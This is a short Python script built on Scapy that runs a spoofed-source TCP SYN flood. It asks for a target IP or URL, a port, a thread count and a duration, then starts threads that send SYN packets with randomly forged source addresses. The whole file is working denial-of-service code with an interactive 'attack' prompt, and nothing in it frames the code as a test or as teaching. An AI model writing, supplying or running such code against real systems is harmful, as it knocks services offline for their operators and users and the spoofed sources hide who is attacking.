from scapy.all import *
from colorama import Fore
import time, threading, sys, random, string

_abort = False

def _ssyn(_ip, _prt):
    while _abort == False:
        try:
            fake = ".".join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(src=fake, dst=_ip) / TCP(sport=RandShort(), dport=int(_prt), flags="S", seq=RandShort())
            send(pkt, verbose=False)
        except:
            pass
            
def _rslv(_host):
    from urllib.parse import urlparse
    try:
        xhost = _host.lower()
        if not (xhost.startswith("http://") or xhost.startswith("https://")):
            xhost = "http://" + xhost
         
        _domain = urlparse(xhost).netloc
        _eip = socket.gethostbyname(_domain)
        return _eip
    except:
        sys.exit()

def main():
    global _abort
    try:
        arg1 = input('\r\n\033[1m \033[34mIP/URL: \033[31m')
        arg1 = _rslv(arg1)
        arg2 = input(' \033[34mPORT: \033[31m')
        _thdz = input(' \033[34mTHREAD/S: \033[31m')
        _time = input(' \033[34mSECONDS: \033[31m')
    except KeyboardInterrupt:
        sys.exit()
    
    z = input('\r\n\033[37m Ready? Strike <ENTER> to attack and <CTRL+C> to quit...')
    
    print('\r\n\r\n ---> Spoofed SYN flood sent to ' + arg1 + ' for ' + _time + ' seconds!')
    tasks = []
    for x in range(0, int(_thdz)):
        x = threading.Thread(target=_ssyn, args=(arg1, arg2))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(_time)
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit()
    
if __name__ == "__main__":
    main()
